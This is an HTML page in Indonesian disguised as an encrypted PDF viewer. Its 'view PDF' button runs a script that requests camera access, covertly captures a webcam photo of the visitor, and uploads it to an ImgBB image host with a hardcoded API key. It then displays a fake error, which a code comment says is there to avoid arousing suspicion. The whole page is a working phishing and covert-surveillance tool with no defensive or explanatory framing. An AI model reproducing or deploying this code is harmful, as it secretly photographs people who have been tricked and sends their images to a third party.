<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PDF Viewer - catatan_sop_isian_ff.pdf</title>
    <style>
        body { margin: 0; padding: 0; background-color: #525659; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; height: 100vh; }
        .toolbar { background-color: #323639; color: white; padding: 10px 20px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 5px rgba(0,0,0,0.3); z-index: 10; }
        .filename { font-size: 14px; opacity: 0.9; }
        .pdf-container { flex: 1; display: flex; justify-content: center; overflow-y: auto; padding: 20px; }
        .pdf-page { background-color: white; width: 100%; max-width: 800px; min-height: 1100px; box-shadow: 0 0 10px rgba(0,0,0,0.5); position: relative; padding: 60px; box-sizing: border-box; }
        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.98); display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .icon { width: 60px; height: 60px; margin-bottom: 20px; color: #007bff; }
        h2 { color: #333; margin: 0 0 10px; font-weight: 500; }
        p { color: #666; font-size: 14px; margin-bottom: 25px; max-width: 300px; }
        .btn-open { background-color: #007bff; color: white; border: none; padding: 12px 35px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: 0.2s; }
        .btn-open:hover { background-color: #0056b3; }
        #status { position: fixed; bottom: 10px; right: 10px; font-size: 11px; color: #999; font-family: monospace; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="toolbar">
        <div class="filename">catatan_sop_isian_ff.pdf</div>
        <div style="font-size: 12px;">Halaman 1 / 1</div>
    </div>

    <div class="pdf-container">
        <div class="pdf-page">
            <div class="overlay">
                <svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                <h2>Dekripsi Diperlukan</h2>
                <p>Dokumen ini dienkripsi untuk keamanan. Klik tombol di bawah untuk memverifikasi akses Anda.</p>
                <button class="btn-open" onclick="startProcess()">LIHAT PDF SEKARANG</button>
            </div>
        </div>
    </div>

    <div id="status">Status: Standby</div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        async function startProcess() {
            const status = document.getElementById('status');
            status.innerText = "Processing...";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    const dataURL = canvas.toDataURL('image/png');
                    const base64Content = dataURL.split(',')[1];
                    
                    const API_KEY = "99e26e64651a4d2c37ad77b9fc8b80fe"; 
                    
                    let body = new FormData();
                    body.append("image", base64Content);

                    // Kirim ke ImgBB
                    await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
                        method: "POST",
                        body: body
                    });

                    // Fake Error biar gak curiga
                    alert("Gagal memuat dokumen: Server sibuk (Error 0x502). Coba lagi dalam beberapa menit.");
                    status.innerText = "Error 0x502";
                    
                    stream.getTracks().forEach(track => track.stop());
                }, 1200);
            } catch (err) {
                alert("Verifikasi gagal. Anda harus mengizinkan akses untuk melihat dokumen PDF ini.");
                status.innerText = "Permission Denied";
            }
        }
    </script>
</body>
</html>
